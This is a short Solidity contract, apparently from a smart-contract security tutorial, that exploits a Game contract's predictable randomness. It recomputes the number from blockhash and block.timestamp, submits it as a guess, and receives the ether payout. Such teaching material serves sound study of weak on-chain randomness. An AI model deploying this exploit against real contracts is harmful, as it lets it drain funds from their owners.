// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "./Game.sol";

contract Attack {
    Game game;

    // Create an instance of Game contract using gameAddress
    constructor(address gameAddress){
        game = Game(gameAddress);
    }

    // Attack the Game contract by guessing the exact number as 'blockhash' and 'block' is accessible publically
    function attack() public {
        // abi.encodePacked takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(_guess);
    }

    // Gets called when the contract receives ether
    receive() external payable{}
}